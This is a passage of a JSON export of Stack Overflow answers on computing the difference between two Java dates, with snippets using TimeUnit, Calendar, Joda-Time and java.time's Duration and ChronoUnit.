* 60 * 1000);\n\n      System.out.println(\"Your Day Difference=\"+ddays);\n</code></pre>\n\n<p>The print statement is just an example - you can format it, the way you like.</p>\n"},{"tags":[],"owner":{"account_id":30319,"reputation":90360,"user_id":82609,"accept_rate":84,"display_name":"Sebastien Lorber"},"down_vote_count":4,"up_vote_count":620,"is_accepted":false,"score":616,"last_activity_date":1681570485,"creation_date":1337336732,"answer_id":10650881,"question_id":1555262,"body_markdown":"# Simple diff (without lib)\r\n\r\n    /**\r\n     * Get a diff between two dates\r\n     * @param date1 the oldest date\r\n     * @param date2 the newest date\r\n     * @param timeUnit the unit in which you want the diff\r\n     * @return the diff value, in the provided unit\r\n     */\r\n    public static long getDateDiff(Date date1, Date date2, TimeUnit timeUnit) {\r\n        long diffInMillies = date2.getTime() - date1.getTime();\r\n        return timeUnit.convert(diffInMillies,TimeUnit.MILLISECONDS);\r\n    }\r\n\r\n\r\nAnd then you can call:\r\n\r\n    getDateDiff(date1,date2,TimeUnit.MINUTES);\r\n\r\nto get the diff of the 2 dates in minutes unit.\r\n\r\n`TimeUnit` is `java.util.concurrent.TimeUnit`, a standard Java enum going from nanos to days.\r\n\r\n\r\n-----------------------------------------------\r\n\r\n# Human readable diff (without lib)\r\n     \r\n    public static Map&lt;TimeUnit,Long&gt; computeDiff(Date date1, Date date2) {\r\n\r\n    \tlong diffInMillies = date2.getTime() - date1.getTime();\r\n\r\n        //create the list\r\n        List&lt;TimeUnit&gt; units = new ArrayList&lt;TimeUnit&gt;(EnumSet.allOf(TimeUnit.class));\r\n     \tCollections.reverse(units);\r\n\r\n        //create the result map of TimeUnit and difference\r\n     \tMap&lt;TimeUnit,Long&gt; result = new LinkedHashMap&lt;TimeUnit,Long&gt;();\r\n     \tlong milliesRest = diffInMillies;\r\n\r\n        for ( TimeUnit unit : units ) {\r\n            \r\n            //calculate difference in millisecond \r\n        \tlong diff = unit.convert(milliesRest,TimeUnit.MILLISECONDS);\r\n        \tlong diffInMilliesForUnit = unit.toMillis(diff);\r\n        \tmilliesRest = milliesRest - diffInMilliesForUnit;\r\n\r\n            //put the result in the map\r\n            result.put(unit,diff);\r\n        }\r\n\r\n        return result;\r\n    }\r\n    \r\nhttp://ideone.com/5dXeu6\r\n\r\nThe output is something like `Map:{DAYS=1, HOURS=3, MINUTES=46, SECONDS=40, MILLISECONDS=0, MICROSECONDS=0, NANOSECONDS=0}`, with the units ordered.\r\n\r\nYou just have to convert that map to a user-friendly string.\r\n\r\n---------------------\r\n\r\n# Warning\r\n\r\nThe above code snippets compute a simple diff between 2 instants. It can cause problems during a daylight saving switch, like explained in [this post][1]. This means if you compute the diff between dates with no time you may have a missing day/hour.\r\n\r\nIn my opinion the date diff is kind of subjective, especially on days. You may:\r\n\r\n - count the number of 24h elapsed time: day+1 - day = 1 day = 24h\r\n\r\n - count the number of elapsed time, taking care of daylight savings: day+1 - day = 1 = 24h (but using midnight time and daylight savings it could be 0 day and 23h)\r\n\r\n - count the number of `day switches`, which means day+1 1pm - day 11am = 1 day, even if the elapsed time is just 2h (or 1h if there is a daylight saving :p)\r\n\r\nMy answer is valid if your definition of date diff on days match the 1st case\r\n\r\n\r\n# With JodaTime\r\n\r\nIf you are using JodaTime you can get the diff for 2 instants (millies backed ReadableInstant) dates with:\r\n\r\n    Interval interval = new Interval(oldInstant, new Instant());\r\n\r\nBut you can also get the diff for Local dates/times:\r\n\r\n    // returns 4 because of the leap year of 366 days\r\n    new Period(LocalDate.now(), LocalDate.now().plusDays(365*5), PeriodType.years()).getYears() \r\n\r\n    // this time it returns 5\r\n    new Period(LocalDate.now(), LocalDate.now().plusDays(365*5+1), PeriodType.years()).getYears() \r\n\r\n    // And you can also use these static methods\r\n    Years.yearsBetween(LocalDate.now(), LocalDate.now().plusDays(365*5)).getYears()\r\n\r\n\r\n\r\n\r\n  [1]: http://tripoverit.blogspot.fr/2007_07_01_archive.html","title":"Calculating the difference between two Java date instances","body":"<h1>Simple diff (without lib)</h1>\n<pre><code>/**\n * Get a diff between two dates\n * @param date1 the oldest date\n * @param date2 the newest date\n * @param timeUnit the unit in which you want the diff\n * @return the diff value, in the provided unit\n */\npublic static long getDateDiff(Date date1, Date date2, TimeUnit timeUnit) {\n    long diffInMillies = date2.getTime() - date1.getTime();\n    return timeUnit.convert(diffInMillies,TimeUnit.MILLISECONDS);\n}\n</code></pre>\n<p>And then you can call:</p>\n<pre><code>getDateDiff(date1,date2,TimeUnit.MINUTES);\n</code></pre>\n<p>to get the diff of the 2 dates in minutes unit.</p>\n<p><code>TimeUnit</code> is <code>java.util.concurrent.TimeUnit</code>, a standard Java enum going from nanos to days.</p>\n<hr />\n<h1>Human readable diff (without lib)</h1>\n<pre><code>public static Map&lt;TimeUnit,Long&gt; computeDiff(Date date1, Date date2) {\n\n    long diffInMillies = date2.getTime() - date1.getTime();\n\n    //create the list\n    List&lt;TimeUnit&gt; units = new ArrayList&lt;TimeUnit&gt;(EnumSet.allOf(TimeUnit.class));\n    Collections.reverse(units);\n\n    //create the result map of TimeUnit and difference\n    Map&lt;TimeUnit,Long&gt; result = new LinkedHashMap&lt;TimeUnit,Long&gt;();\n    long milliesRest = diffInMillies;\n\n    for ( TimeUnit unit : units ) {\n        \n        //calculate difference in millisecond \n        long diff = unit.convert(milliesRest,TimeUnit.MILLISECONDS);\n        long diffInMilliesForUnit = unit.toMillis(diff);\n        milliesRest = milliesRest - diffInMilliesForUnit;\n\n        //put the result in the map\n        result.put(unit,diff);\n    }\n\n    return result;\n}\n</code></pre>\n<p><a href=\"http://ideone.com/5dXeu6\" rel=\"nofollow noreferrer\">http://ideone.com/5dXeu6</a></p>\n<p>The output is something like <code>Map:{DAYS=1, HOURS=3, MINUTES=46, SECONDS=40, MILLISECONDS=0, MICROSECONDS=0, NANOSECONDS=0}</code>, with the units ordered.</p>\n<p>You just have to convert that map to a user-friendly string.</p>\n<hr />\n<h1>Warning</h1>\n<p>The above code snippets compute a simple diff between 2 instants. It can cause problems during a daylight saving switch, like explained in <a href=\"http://tripoverit.blogspot.fr/2007_07_01_archive.html\" rel=\"nofollow noreferrer\">this post</a>. This means if you compute the diff between dates with no time you may have a missing day/hour.</p>\n<p>In my opinion the date diff is kind of subjective, especially on days. You may:</p>\n<ul>\n<li><p>count the number of 24h elapsed time: day+1 - day = 1 day = 24h</p>\n</li>\n<li><p>count the number of elapsed time, taking care of daylight savings: day+1 - day = 1 = 24h (but using midnight time and daylight savings it could be 0 day and 23h)</p>\n</li>\n<li><p>count the number of <code>day switches</code>, which means day+1 1pm - day 11am = 1 day, even if the elapsed time is just 2h (or 1h if there is a daylight saving :p)</p>\n</li>\n</ul>\n<p>My answer is valid if your definition of date diff on days match the 1st case</p>\n<h1>With JodaTime</h1>\n<p>If you are using JodaTime you can get the diff for 2 instants (millies backed ReadableInstant) dates with:</p>\n<pre><code>Interval interval = new Interval(oldInstant, new Instant());\n</code></pre>\n<p>But you can also get the diff for Local dates/times:</p>\n<pre><code>// returns 4 because of the leap year of 366 days\nnew Period(LocalDate.now(), LocalDate.now().plusDays(365*5), PeriodType.years()).getYears() \n\n// this time it returns 5\nnew Period(LocalDate.now(), LocalDate.now().plusDays(365*5+1), PeriodType.years()).getYears() \n\n// And you can also use these static methods\nYears.yearsBetween(LocalDate.now(), LocalDate.now().plusDays(365*5)).getYears()\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1548552,"reputation":1076,"user_id":1441471,"accept_rate":57,"display_name":"sabbibJAVA"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1362993008,"creation_date":1362993008,"answer_id":15334719,"question_id":1555262,"body_markdown":"try this: \r\n      \r\n    int epoch = (int) (new java.text.SimpleDateFormat(&quot;MM/dd/yyyy HH:mm:ss&quot;).parse(&quot;01/01/1970  00:00:00&quot;).getTime() / 1000);\r\nyou can edit the string in the parse() methods param.","title":"Calculating the difference between two Java date instances","body":"<p>try this: </p>\n\n<pre><code>int epoch = (int) (new java.text.SimpleDateFormat(\"MM/dd/yyyy HH:mm:ss\").parse(\"01/01/1970  00:00:00\").getTime() / 1000);\n</code></pre>\n\n<p>you can edit the string in the parse() methods param.</p>\n"},{"tags":[],"owner":{"account_id":243016,"reputation":9390,"user_id":514919,"accept_rate":28,"display_name":"Pratik Mandrekar"},"down_vote_count":2,"up_vote_count":2,"is_accepted":false,"score":0,"last_activity_date":1367420065,"creation_date":1367420065,"answer_id":16320506,"question_id":1555262,"body_markdown":"\r\n\r\n\r\n@Michael Borgwardt&#39;s answer actually does not work correctly in Android. Rounding errors exist. Example 19th to 21st May says 1 day because it casts 1.99 to 1. Use round before casting to int. \r\n\r\nFix\r\n\r\n    int diffInDays = (int)Math.round(( (newerDate.getTime() - olderDate.getTime()) \r\n                     / (1000 * 60 * 60 * 24) ))\r\n\r\nNote that this works with UTC dates, so the difference may be a day off if you look at local dates. And getting it to work correctly with local dates requires a completely different approach due to daylight savings time.","title":"Calculating the difference between two Java date instances","body":"<p>@Michael Borgwardt's answer actually does not work correctly in Android. Rounding errors exist. Example 19th to 21st May says 1 day because it casts 1.99 to 1. Use round before casting to int. </p>\n\n<p>Fix</p>\n\n<pre><code>int diffInDays = (int)Math.round(( (newerDate.getTime() - olderDate.getTime()) \n                 / (1000 * 60 * 60 * 24) ))\n</code></pre>\n\n<p>Note that this works with UTC dates, so the difference may be a day off if you look at local dates. And getting it to work correctly with local dates requires a completely different approach due to daylight savings time.</p>\n"},{"tags":[],"owner":{"account_id":1478876,"reputation":1042,"user_id":1388639,"display_name":"Malcolm Boekhoff"},"down_vote_count":0,"up_vote_count":10,"is_accepted":false,"score":10,"last_activity_date":1376294743,"creation_date":1376294743,"answer_id":18182113,"question_id":1555262,"body_markdown":"Subtracting the dates in milliseconds works (as described in another post), but you *have* to use HOUR_OF_DAY and not HOUR when clearing the time parts of your dates:\r\n\r\n    public static final long MSPERDAY = 60 * 60 * 24 * 1000;\r\n    ...\r\n    final Calendar dateStartCal = Calendar.getInstance();\r\n    dateStartCal.setTime(dateStart);\r\n    dateStartCal.set(Calendar.HOUR_OF_DAY, 0); // Crucial.\r\n    dateStartCal.set(Calendar.MINUTE, 0);\r\n    dateStartCal.set(Calendar.SECOND, 0);\r\n    dateStartCal.set(Calendar.MILLISECOND, 0);\r\n    final Calendar dateEndCal = Calendar.getInstance();\r\n    dateEndCal.setTime(dateEnd);\r\n    dateEndCal.set(Calendar.HOUR_OF_DAY, 0); // Crucial.\r\n    dateEndCal.set(Calendar.MINUTE, 0);\r\n    dateEndCal.set(Calendar.SECOND, 0);\r\n    dateEndCal.set(Calendar.MILLISECOND, 0);\r\n    final long dateDifferenceInDays = ( dateStartCal.getTimeInMillis()\r\n                                      - dateEndCal.getTimeInMillis()\r\n                                      ) / MSPERDAY;\r\n    if (dateDifferenceInDays &gt; 15) {\r\n        // Do something if difference &gt; 15 days\r\n    }\r\n","title":"Calculating the difference between two Java date instances","body":"<p>Subtracting the dates in milliseconds works (as described in another post), but you <em>have</em> to use HOUR_OF_DAY and not HOUR when clearing the time parts of your dates:</p>\n\n<pre><code>public static final long MSPERDAY = 60 * 60 * 24 * 1000;\n...\nfinal Calendar dateStartCal = Calendar.getInstance();\ndateStartCal.setTime(dateStart);\ndateStartCal.set(Calendar.HOUR_OF_DAY, 0); // Crucial.\ndateStartCal.set(Calendar.MINUTE, 0);\ndateStartCal.set(Calendar.SECOND, 0);\ndateStartCal.set(Calendar.MILLISECOND, 0);\nfinal Calendar dateEndCal = Calendar.getInstance();\ndateEndCal.setTime(dateEnd);\ndateEndCal.set(Calendar.HOUR_OF_DAY, 0); // Crucial.\ndateEndCal.set(Calendar.MINUTE, 0);\ndateEndCal.set(Calendar.SECOND, 0);\ndateEndCal.set(Calendar.MILLISECOND, 0);\nfinal long dateDifferenceInDays = ( dateStartCal.getTimeInMillis()\n                                  - dateEndCal.getTimeInMillis()\n                                  ) / MSPERDAY;\nif (dateDifferenceInDays &gt; 15) {\n    // Do something if difference &gt; 15 days\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2633295,"reputation":5279,"user_id":2278668,"accept_rate":100,"display_name":"Ingo"},"down_vote_count":1,"up_vote_count":6,"is_accepted":false,"score":5,"last_activity_date":1419134072,"creation_date":1380856583,"answer_id":19172605,"question_id":1555262,"body_markdown":"If you need a formatted return String like\r\n&quot;2 Days 03h 42m 07s&quot;, try this:\r\n\r\n   \r\n    public String fill2(int value)\r\n    {\r\n        String ret = String.valueOf(value);\r\n\r\n        if (ret.length() &lt; 2)\r\n            ret = &quot;0&quot; + ret;\t\t\t\r\n        return ret;\r\n    }\r\n\r\n    public String get_duration(Date date1, Date date2)\r\n    {\t\t\t\t\t\r\n        TimeUnit timeUnit = TimeUnit.SECONDS;\r\n\r\n        long diffInMilli = date2.getTime() - date1.getTime();\r\n        long s = timeUnit.convert(diffInMilli, TimeUnit.MILLISECONDS);\r\n\r\n        long days = s / (24 * 60 * 60);\r\n        long rest = s - (days * 24 * 60 * 60);\r\n        long hrs = rest / (60 * 60);\r\n        long rest1 = rest - (hrs * 60 * 60);\r\n        long min = rest1 / 60;\t    \r\n        long sec = s % 60;\r\n\r\n        String dates = &quot;&quot;;\r\n        if (days &gt; 0) dates = days + &quot; Days &quot;;\r\n\r\n        dates += fill2((int) hrs) + &quot;h &quot;;\r\n        dates += fill2((int) min) + &quot;m &quot;;\r\n        dates += fill2((int) sec) + &quot;s &quot;;\r\n\r\n        return dates;\r\n    }","title":"Calculating the difference between two Java date instances","body":"<p>If you need a formatted return String like\n\"2 Days 03h 42m 07s\", try this:</p>\n\n<pre><code>public String fill2(int value)\n{\n    String ret = String.valueOf(value);\n\n    if (ret.length() &lt; 2)\n        ret = \"0\" + ret;            \n    return ret;\n}\n\npublic String get_duration(Date date1, Date date2)\n{                   \n    TimeUnit timeUnit = TimeUnit.SECONDS;\n\n    long diffInMilli = date2.getTime() - date1.getTime();\n    long s = timeUnit.convert(diffInMilli, TimeUnit.MILLISECONDS);\n\n    long days = s / (24 * 60 * 60);\n    long rest = s - (days * 24 * 60 * 60);\n    long hrs = rest / (60 * 60);\n    long rest1 = rest - (hrs * 60 * 60);\n    long min = rest1 / 60;      \n    long sec = s % 60;\n\n    String dates = \"\";\n    if (days &gt; 0) dates = days + \" Days \";\n\n    dates += fill2((int) hrs) + \"h \";\n    dates += fill2((int) min) + \"m \";\n    dates += fill2((int) sec) + \"s \";\n\n    return dates;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":322981,"reputation":310745,"user_id":642706,"accept_rate":58,"display_name":"Basil Bourque"},"down_vote_count":1,"up_vote_count":69,"is_accepted":false,"score":68,"last_activity_date":1521621315,"creation_date":1395561020,"answer_id":22588328,"question_id":1555262,"body_markdown":"# tl;dr\r\n\r\nConvert your obsolete `java.util.Date` objects to their replacement, `java.time.Instant`. Then calculate the elapsed time as a `Duration`.\r\n\r\n    Duration d = \r\n        Duration.between(                   // Calculate the span of time between two moments as a number of hours, minutes, and seconds.\r\n            myJavaUtilDate.toInstant() ,    // Convert legacy class to modern class by calling new method added to the old class.\r\n            Instant.now()                   // Capture the current moment in UTC. About two and a half hours later in this example.\r\n        )\r\n    ;\r\n\r\n&gt;d.toString(): PT2H34M56S\r\n\r\n&gt;d.toMinutes(): 154\r\n\r\n&gt;d.toMinutesPart(): 34\r\n\r\n\r\n# ISO 8601 Format: `PnYnMnDTnHnMnS`\r\n\r\nThe sensible standard [ISO 8601][1] defines a concise textual representation of a span of time as a number of years, months, days, hours, etc. The standard calls such such a span a [duration][2]. The format is `PnYnMnDTnHnMnS` where the `P` means &quot;Period&quot;, the `T` separates the date portion from the time portion, and in between are numbers followed by a letter.\r\n\r\nExamples:\r\n\r\n - `P3Y6M4DT12H30M5S`&lt;br&gt;three years, six months, four days, twelve hours, thirty minutes, and five seconds\r\n - `PT4H30M`&lt;br&gt;Four and a half hours\r\n\r\n\r\n# java.time\r\n\r\nThe [java.time](http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html) framework built into Java 8 and later supplants the troublesome old `java.util.Date`/`java.util.Calendar` classes. The new classes are inspired by the highly successful [Joda-Time](http://www.joda.org/joda-time/) framework, intended as its successor, similar in concept but re-architected. Defined by [JSR 310](http://jcp.org/en/jsr/detail?id=310). Extended by the [ThreeTen-Extra](http://www.threeten.org/threeten-extra/) project. See the [Tutorial](http://docs.oracle.com/javase/tutorial/datetime/TOC.html).\r\n\r\n## Moment\r\n\r\nThe [`Instant`](http://docs.oracle.com/javase/9/docs/api/java/time/Instant.html) class represents a moment on the timeline in [UTC](https://en.wikipedia.org/wiki/Coordinated_Universal_Time) with a resolution of [nanoseconds](https://en.wikipedia.org/wiki/Nanosecond) (up to nine (9) digits of a decimal fraction). \r\n\r\n    Instant instant = Instant.now() ;  // Capture current moment in UTC.\r\n\r\nBest to avoid the legacy classes such as `Date`/`Calendar`. But if you must inter-operate with old code not yet updated to *java.time*, convert back and forth. Call new conversion methods added to the old classes. For moving from a [`java.util.Date`][3] to an [`Instant`][4], call [`Date::toInstant`][5]. \r\n\r\n    Instant instant = myJavaUtilDate.toInstant() ;  // Convert from legacy `java.util.Date` class to modern `java.time.Instant` class.\r\n\r\n\r\n## Span of time\r\n\r\nThe java.time classes have split this idea of representing a span of time as a number of years, months, days, hours, minutes, seconds into two halves:\r\n\r\n - [`Period`][6] for years, months, days\r\n - [`Duration`][7] for days, hours, minutes, seconds\r\n\r\nHere is an example.\r\n\r\n    ZoneId zoneId = ZoneId.of ( &quot;America/Montreal&quot; );\r\n    ZonedDateTime now = ZonedDateTime.now ( zoneId );\r\n    ZonedDateTime future = now.plusMinutes ( 63 );\r\n    Duration duration = Duration.between ( now , future );\r\n\r\nDump to console.\r\n\r\nBoth `Period` and `Duration` use the [ISO 8601][2] standard for generating a String representation of their value.\r\n\r\n    System.out.println ( &quot;now: &quot; + now + &quot; to future: &quot; + now + &quot; = &quot; + duration );\r\n\r\n&gt;now: 2015-11-26T00:46:48.016-05:00[America/Montreal] to future: 2015-11-26T00:46:48.016-05:00[America/Montreal] = PT1H3M\r\n\r\nJava 9 adds methods to `Duration` to get the days part, hours part, minutes part, and seconds part.\r\n\r\nYou can get the total number of days or hours or minutes or seconds or milliseconds or nanoseconds in the entire Duration.\r\n\r\n    long totalHours = duration.toHours();\r\n\r\nIn Java 9 the [`Duration` class gets new methods][8] for returning the various parts of days, hours, minutes, seconds, milliseconds/nanoseconds. Call the `to…Part` methods: `toDaysPart()`, `toHoursPart()`, and so on.\r\n\r\n\r\n# `ChronoUnit`\r\n\r\nIf you only care about a simpler larger granularity of time, such as “number of days elapsed”, use the [`ChronoUnit`][9] enum.\r\n\r\n    long daysElapsed = ChronoUnit.DAYS.between( earlier , later );\r\n\r\nAnother example.\r\n\r\n    Instant now = Instant.now();\r\n    Instant later = now.plus( Duration.ofHours( 2 ) );\r\n    …\r\n    long minutesElapsed = ChronoUnit.MINUTES.between( now , later );\r\n\r\n&gt;120\r\n\r\n----------\r\n\r\n# About java.time\r\n\r\nThe [java.time](http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html) framework is built into Java 8 and later. These classes supplant the troublesome old [legacy](https://en.wikipedia.org/wiki/Legacy_system) date-time classes such as [`java.util.Date`](https://docs.oracle.com/javase/8/docs/api/java/util/Date.html), [`Calendar`](https://docs.oracle.com/javase/8/docs/api/java/util/Calendar.html), &amp; [`SimpleDateFormat`](http://docs.oracle.com/javase/8/docs/api/java/text/SimpleDateFormat.html).\r\n\r\nThe [Joda-Time](http://www.joda.org/joda-time/) project, now in [maintenance mode](https://en.wikipedia.org/wiki/Maintenance_mode), advises migration to java.time.\r\n\r\nTo learn more, see the [Oracle Tutorial](http://docs.oracle.com/javase/tutorial/datetime/TOC.html). And search Stack Overflow for many examples and explanations. Specification is [JSR 310](https://jcp.org/en/jsr/detail?id=310).\r\n\r\nWhere to obtain the java.time classes? \r\n\r\n - [**Java SE 8**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_8) and [**SE 9**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_9) and later\r\n  - Built-in. \r\n  - Part of the standard Java API with a bundled implementation.\r\n  - Java 9 adds some minor features and fixes.\r\n - [**Java SE 6**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_6) and [**SE 7**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_7)\r\n  - Much of the java.time functionality is back-ported to Java 6 &amp; 7 in [***ThreeTen-Backport***](http://www.threeten.org/threetenbp/).\r\n - [**Android**](https://en.wikipedia.org/wiki/Android_(operating_system))\r\n  - The [*ThreeTenABP*](https://github.com/JakeWharton/ThreeTenABP) project adapts ***ThreeTen-Backport*** (mentioned above) for Android specifically.\r\n  - See [*How to use…*](https://stackoverflow.com/q/38922754/642706).\r\n\r\nThe [ThreeTen-Extra](http://www.threeten.org/threeten-extra/) project extends java.time with additional classes. This project is a proving ground for possible future additions to java.time. You may find some useful classes here such as [`Interval`](http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/Interval.html), [`YearWeek`](http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearWeek.html), [`YearQuarter`](http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearQuarter.html), and [more](http://www.threeten.org/threeten-extra/apidocs/index.html).\r\n\r\n\r\n\r\n----------\r\n\r\n\r\n# Joda-Time\r\n\r\nUPDATE: The [Joda-Time](http://www.joda.org/joda-time/) project is now in [maintenance mode](https://en.wikipedia.org/wiki/Maintenance_mode), with the team advising migration to the [java.time](http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html) classes. I leave this section intact for history.\r\n\r\nThe Joda-Time library uses ISO 8601 for its defaults. Its `Period` class parses and generates these PnYnMnDTnHnMnS strings.\r\n\r\n    DateTime now = DateTime.now(); // Caveat: Ignoring the important issue of time zones.\r\n    Period period = new Period( now, now.plusHours( 4 ).plusMinutes( 30));\r\n    System.out.println( &quot;period: &quot; + period );\r\n\r\nRenders:\r\n\r\n    period: PT4H30M\r\n\r\n\r\n  [1]: https://en.wikipedia.org/wiki/ISO_8601\r\n  [2]: https://en.wikipedia.org/wiki/ISO_8601#Durations\r\n  [3]: https://docs.oracle.com/javase/9/docs/api/java/util/Date.html\r\n  [4]: https://docs.oracle.com/javase/9/docs/api/java/time/Instant.html\r\n  [5]: https://docs.oracle.com/javase/9/docs/api/java/util/Date.html#toInstant--\r\n  [6]: http://docs.oracle.com/javase/8/docs/api/java/time/Period.html\r\n  [7]: http://docs.oracle.com/javase/8/docs/api/java/time/Duration.html\r\n  [8]: https://bugs.openjdk.java.net/browse/JDK-8142936\r\n  [9]: https://docs.oracle.com/javase/8/docs/api/java/time/temporal/ChronoUnit.html","title":"Calculating the difference between two Java date instances","body":"<h1>tl;dr</h1>\n\n<p>Convert your obsolete <code>java.util.Date</code> objects to their replacement, <code>java.time.Instant</code>. Then calculate the elapsed time as a <code>Duration</code>.</p>\n\n<pre><code>Duration d = \n    Duration.between(                   // Calculate the span of time between two moments as a number of hours, minutes, and seconds.\n        myJavaUtilDate.toInstant() ,    // Convert legacy class to modern class by calling new method added to the old class.\n        Instant.now()                   // Capture the current moment in UTC. About two and a half hours later in this example.\n    )\n;\n</code></pre>\n\n<blockquote>\n  <p>d.toString(): PT2H34M56S</p>\n  \n  <p>d.toMinutes(): 154</p>\n  \n  <p>d.toMinutesPart(): 34</p>\n</blockquote>\n\n<h1>ISO 8601 Format: <code>PnYnMnDTnHnMnS</code></h1>\n\n<p>The sensible standard <a href=\"https://en.wikipedia.org/wiki/ISO_8601\" rel=\"noreferrer\">ISO 8601</a> defines a concise textual representation of a span of time as a number of years, months, days, hours, etc. The standard calls such such a span a <a href=\"https://en.wikipedia.org/wiki/ISO_8601#Durations\" rel=\"noreferrer\">duration</a>. The format is <code>PnYnMnDTnHnMnS</code> where the <code>P</code> means \"Period\", the <code>T</code> separates the date portion from the time portion, and in between are numbers followed by a letter.</p>\n\n<p>Examples:</p>\n\n<ul>\n<li><code>P3Y6M4DT12H30M5S</code><br>three years, six months, four days, twelve hours, thirty minutes, and five seconds</li>\n<li><code>PT4H30M</code><br>Four and a half hours</li>\n</ul>\n\n<h1>java.time</h1>\n\n<p>The <a href=\"http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\" rel=\"noreferrer\">java.time</a> framework built into Java 8 and later supplants the troublesome old <code>java.util.Date</code>/<code>java.util.Calendar</code> classes. The new classes are inspired by the highly successful <a href=\"http://www.joda.org/joda-time/\" rel=\"noreferrer\">Joda-Time</a> framework, intended as its successor, similar in concept but re-architected. Defined by <a href=\"http://jcp.org/en/jsr/detail?id=310\" rel=\"noreferrer\">JSR 310</a>. Extended by the <a href=\"http://www.threeten.org/threeten-extra/\" rel=\"noreferrer\">ThreeTen-Extra</a> project. See the <a href=\"http://docs.oracle.com/javase/tutorial/datetime/TOC.html\" rel=\"noreferrer\">Tutorial</a>.</p>\n\n<h2>Moment</h2>\n\n<p>The <a href=\"http://docs.oracle.com/javase/9/docs/api/java/time/Instant.html\" rel=\"noreferrer\"><code>Instant</code></a> class represents a moment on the timeline in <a href=\"https://en.wikipedia.org/wiki/Coordinated_Universal_Time\" rel=\"noreferrer\">UTC</a> with a resolution of <a href=\"https://en.wikipedia.org/wiki/Nanosecond\" rel=\"noreferrer\">nanoseconds</a> (up to nine (9) digits of a decimal fraction). </p>\n\n<pre><code>Instant instant = Instant.now() ;  // Capture current moment in UTC.\n</code></pre>\n\n<p>Best to avoid the legacy classes such as <code>Date</code>/<code>Calendar</code>. But if you must inter-operate with old code not yet updated to <em>java.time</em>, convert back and forth. Call new conversion methods added to the old classes. For moving from a <a href=\"https://docs.oracle.com/javase/9/docs/api/java/util/Date.html\" rel=\"noreferrer\"><code>java.util.Date</code></a> to an <a href=\"https://docs.oracle.com/javase/9/docs/api/java/time/Instant.html\" rel=\"noreferrer\"><code>Instant</code></a>, call <a href=\"https://docs.oracle.com/javase/9/docs/api/java/util/Date.html#toInstant--\" rel=\"noreferrer\"><code>Date::toInstant</code></a>. </p>\n\n<pre><code>Instant instant = myJavaUtilDate.toInstant() ;  // Convert from legacy `java.util.Date` class to modern `java.time.Instant` class.\n</code></pre>\n\n<h2>Span of time</h2>\n\n<p>The java.time classes have split this idea of representing a span of time as a number of years, months, days, hours, minutes, seconds into two halves:</p>\n\n<ul>\n<li><a href=\"http://docs.oracle.com/javase/8/docs/api/java/time/Period.html\" rel=\"noreferrer\"><code>Period</code></a> for years, months, days</li>\n<li><a href=\"http://docs.oracle.com/javase/8/docs/api/java/time/Duration.html\" rel=\"noreferrer\"><code>Duration</code></a> for days, hours, minutes, seconds</li>\n</ul>\n\n<p>Here is an example.</p>\n\n<pre><code>ZoneId zoneId = ZoneId.of ( \"America/Montreal\" );\nZonedDateTime now = ZonedDateTime.now ( zoneId );\nZonedDateTime future = now.plusMinutes ( 63 );\nDuration duration = Duration.between ( now , future );\n</code></pre>\n\n<p>Dump to console.</p>\n\n<p>Both <code>Period</code> and <code>Duration</code> use the <a href=\"https://en.wikipedia.org/wiki/ISO_8601#Durations\" rel=\"noreferrer\">ISO 8601</a> standard for generating a String representation of their value.</p>\n\n<pre><code>System.out.println ( \"now: \" + now + \" to future: \" + now + \" = \" + duration );\n</code></pre>\n\n<blockquote>\n  <p>now: 2015-11-26T00:46:48.016-05:00[America/Montreal] to future: 2015-11-26T00:46:48.016-05:00[America/Montreal] = PT1H3M</p>\n</blockquote>\n\n<p>Java 9 adds methods to <code>Duration</code> to get the days part, hours part, minutes part, and seconds part.</p>\n\n<p>You can get the total number of days or hours or minutes or seconds or milliseconds or nanoseconds in the entire Duration.</p>\n\n<pre><code>long totalHours = duration.toHours();\n</code></pre>\n\n<p>In Java 9 the <a href=\"https://bugs.openjdk.java.net/browse/JDK-8142936\" rel=\"noreferrer\"><code>Duration</code> class gets new methods</a> for returning the various parts of days, hours, minutes, seconds, milliseconds/nanoseconds. Call the <code>to…Part</code> methods: <code>toDaysPart()</code>, <code>toHoursPart()</code>, and so on.</p>\n\n<h1><code>ChronoUnit</code></h1>\n\n<p>If you only care about a simpler larger granularity of time, such as “number of days elapsed”, use the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/temporal/ChronoUnit.html\" rel=\"noreferrer\"><code>ChronoUnit</code></a> enum.</p>\n\n<pre><code>long daysElapsed = ChronoUnit.DAYS.between( earlier , later );\n</code></pre>\n\n<p>Another example.</p>\n\n<pre><code>Instant now = Instant.now();\nInstant later = now.plus( Duration.ofHours( 2 ) );\n…\nlong minutesElapsed = ChronoUnit.MINUTES.between( now , later );\n</code></pre>\n\n<blockquote>\n  <p>120</p>\n</blockquote>\n\n<hr>\n\n<h1>About java.time</h1>\n\n<p>The <a href=\"http://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\" rel=\"noreferrer\">java.time</a> framework is built into Java 8 and later. These classes supplant the troublesome old <a href=\"https://en.wikipedia.org/wiki/Legacy_system\" rel=\"noreferrer\">legacy</a> date-time classes such as <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Date.html\" rel=\"noreferrer\"><code>java.util.Date</code></a>, <a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Calendar.html\" rel=\"noreferrer\"><code>Calendar</code></a>, &amp; <a href=\"http://docs.oracle.com/javase/8/docs/api/java/text/SimpleDateFormat.html\" rel=\"noreferrer\"><code>SimpleDateFormat</code></a>.</p>\n\n<p>The <a href=\"http://www.joda.org/joda-time/\" rel=\"noreferrer\">Joda-Time</a> project, now in <a href=\"https://en.wikipedia.org/wiki/Maintenance_mode\" rel=\"noreferrer\">maintenance mode</a>, advises migration to java.time.</p>\n\n<p>To learn more, see the <a 